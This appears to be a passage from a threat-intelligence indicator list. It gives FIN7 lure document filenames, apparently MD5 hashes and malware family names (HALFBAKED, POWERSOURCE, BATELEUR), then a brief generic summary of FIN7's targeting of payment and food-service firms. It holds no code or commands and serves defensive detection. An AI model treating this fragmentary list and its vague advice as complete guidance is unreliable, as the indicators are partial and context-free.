HALFBAKED doc1.rtf 94771bcf572d5c0b834f73d577f06cc8 FIN7 HALFBAKED doc1610.rtf 973377e27b5dffa289f84e62a6833ebc FIN7 HALFBAKED Doc0725.rtf 9788b3faa29ba9eb4cae46f3c249937e FIN7 HALFBAKED Doc1.rtf 9b87f9f6498c241f50208f9906907195 FIN7 HALFBAKED doc1.rtf a5f75333d0c81387a5a9c7696b967a20 FIN7 HALFBAKED doc0610.rtf a8e312d0c230e226e97e7a441fadbd85 FIN7 HALFBAKED doc2_r_new.rtf a9c50b7761519fb684cdee2d59f99f91 FIN7 HALFBAKED credit details.rtf aaf42acedc38565f4c33cfdbb09733b9 FIN7 HALFBAKED doc2.docx_ b5cc86726ab8f1fb3c281ab8f935260f FIN7 HALFBAKED b6f005236a37367a147f9060c708ccca FIN7 HALFBAKED doc1.rtf c0d122bcdcb6ede7fc7f1182e4d0e599 FIN7 HALFBAKED doc2806.docx c3f48e69bb90be828ba2835b76fb2080 FIN7 HALFBAKED doc1.rtf c5e94d973ed4f963ddc09ab88def3b5f FIN7 HALFBAKED doc1.rtf c6cddc475d62503a17a34419918e7fc0 FIN7 HALFBAKED doc0714.docx caec3babdec3cf267cc846fd084c4626 FIN7 HALFBAKED doc1909.rtf d1f55491472ca747561509106b71eab8 FIN7 HALFBAKED doc_n0908.docx d38fb2d95812ffa1014e52ef3079e5da FIN7 HALFBAKED catering_.rtf d5cd1dedf3bf5c943e348a8b84e37b2a FIN7 HALFBAKED doc0714.rtf dde72a54716deb88c1ffef2a63faab6b FIN7 HALFBAKED m1.doc e0ca85c0d264b84d977df0c48fd383cc FIN7 HALFBAKED doc1.rtf e17fe2978ebe1b0a6923acd2ffeda3c2 FIN7 HALFBAKED doc2009.rtf e184219366afb2e6bd0b9502beab1156 FIN7 HALFBAKED doc1610.docx e9154e2f80389b853ab4cf2fe98f1ed2 FIN7 HALFBAKED doc1.rtf edc4f02f265a4aaa552435f293409f01 FIN7 HALFBAKED doc2_r_new.rtf ee5a600ef9fd1defe07ea097095d1beb FIN7 HALFBAKED doc1.rtf effdaf7f61acb277ac44ee4d9bc8900a FIN7 HALFBAKED info_.docx f2ac2ec8173db4963dc2089ac90b8807 FIN7 HALFBAKED Doc0725.docx f80a80d25b3393825baa1e84e76ddf6c FIN7 HALFBAKED 1.rtf fa1c548a5d691ac9ce7bfd929f204261 FIN7 HALFBAKED fa93c93a02fe2dee8a3b3d1cd82f293f FIN7 HALFBAKED poisoning.rtf faed087e820cad3c023be1db8d4ba70a FIN7 HALFBAKED order.docx fc661e18137583dc140e201338582a99 FIN7 HALFBAKED SEC_Security_Policy_2017_02.doc 032fe02e54a010d21fd71e97596f4101 FIN7 POWERSOURCE SEC_Security_Policy_2017_10.doc 14334c8f93f049659212773ecee477a2 FIN7 POWERSOURCE VargheseJ.doc 2abad0ae32dd72bac5da0af1e580a2eb FIN7 POWERSOURCE SEC_Security_Policy_2017_03.doc 37d323ffc33a0e1c6cd20234589a965d FIN7 POWERSOURCE 2017.doc 5a88e3825c5e89b07fa9050b6b6eca7c FIN7 POWERSOURCE SEC_Security_Policy_2017.doc 6ff3272cd9edf115230bad6a55cb3ca8 FIN7 POWERSOURCE EDGAR_FILLINGS_RULES_2016.doc 7bd2235f105dee20825b4395a04892bf FIN7 POWERSOURCE SEC_Security_Policy_2017_05.doc 8fa8d4c30429c099dc7e565e57db55c0 FIN7 POWERSOURCE SEC_Security_Policy_2017_06.doc ccd2372bb6b07f1b5a125e597005688d FIN7 POWERSOURCE Important_Changes_to_Form10_K.doc d04b6410dddee19adec75f597c52e386 FIN7 POWERSOURCE SEC_Security_Policy_2017.doc f20328b49ec605fd425ed101ff31f14b FIN7 POWERSOURCE SEC_Security_Policy_2017_07.doc f74958adcfb11abcb37e043013f6a90f FIN7 POWERSOURCE Filings_and_Forms.docx 47111e9854db533c328ddbe6e962602a FIN7 POWERSOURCE (Downloader) doc.doc 189c72bfd8ae31abcff5e7da691a7d30 Suspected FIN7 BATELEUR protected_instructions.d";FIN7 is a criminal organization using various tactics targeting payment card systems and finance institutions. Organizations should implement proper security measures and remain vigilant to stay ahead of the group. FIN7 has recently been targeting the food service industry and has been using a custom-built tool for attacks. It is critical to validate domains and sub-domains authenticity to detect possible FIN7 attacks. Geolocation lookup databases can be used to detect malicious activities and organizations should exercise caution and conduct proper due diligence when investigating potential security threats.;en;
